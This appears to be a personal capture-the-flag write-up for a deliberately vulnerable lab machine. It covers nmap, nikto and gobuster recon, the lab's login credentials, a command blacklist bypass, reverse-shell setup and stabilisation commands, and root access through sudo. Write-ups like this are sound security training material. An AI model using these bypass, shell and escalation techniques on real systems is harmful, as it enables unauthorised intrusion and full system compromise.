
/login.php creds
username: R1ckRul3s, pw: Wubbalubbadubdub -> www-data

Repro steps:

nmap scan
enumerate with nikto after seeing port 80 is open
enumerate with dirbuster looking for php,sh,cgi,js,py,txt extensions found /login.php & /robots.txt
found username for login through page source and pw in /robots.txt
logged in to portal and found command execution 
blacklist on certain commands, bypassed with: while read line; do echo $line; done < FILE_NAME
\*found first ingredient in txt file: mr. meeseek hair
grep -R . to recursively echo the directory contents finding source code blacklist
python shell in comand execution box from pentest monkey
stabilised shell using:
    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm;
    ctrl + z
    stty raw -echo; fg
sudo -l shows we have permissions for all no password
sudo bash and pwned box
\*found third ingredient in root home: fleeb juice
found other users in /home
\*found 2 ingredient in Ricks home dir: 1 jerry tear

Recon:

- nmap  
results:
# Nmap 7.60 scan initiated Thu Oct 20 15:39:18 2022 as: nmap -sC -sV -oN nmap/initial 10.10.166.57
```
Nmap scan report for ip-10-10-166-57.eu-west-1.compute.internal (10.10.166.57)
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:16:44:69:43:da:6d:55:e9:57:bd:9c:d1:c8:ae:51 (RSA)
|   256 90:f9:a0:52:db:30:d4:ea:66:a6:3b:60:d5:a5:0b:d6 (ECDSA)
|_  256 c9:23:31:fb:06:ec:08:7b:88:24:29:11:00:ff:45:62 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
MAC Address: 02:63:4F:F9:87:C9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 20 15:39:27 2022 -- 1 IP address (1 host up) scanned in 8.96 seconds 
```

- nikto
```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.166.57
+ Target Hostname:    ip-10-10-166-57.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2022-10-20 15:47:09 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x426 0x5818ccf125686 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" retrieved but it does not contain any 'disallow' entries (which is odd).
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-10-20 15:47:17 (GMT1) (8 seconds)
---------------------------------------------------------------------------
```

- gobuster dir, wordlist big.txt:
/.htpasswd 403
/.htaccess 403
/assets 301
/server-status 403
/robots.txt

- gobuster dir -w directory-medium -x php,sh,cgi,js,py,txt
/login.php 200
/portal.php 302

- wappalyzer:
web server: Apache 2.4.18
JS libraries: jQuery 3.3.1
OS: Ubuntu
UI frameworks: Bootstrap 3.4.0

- page source:
username found: R1ckRul3s

- burp suite:
page response intercept:
HTTP/1.1 200 OK
Date: Thu, 20 Oct 2022 08:45:26 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Sun, 10 Feb 2019 16:37:33 GMT
ETag: "426-5818ccf125686-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 1062
Connection: close
Content-Type: text/html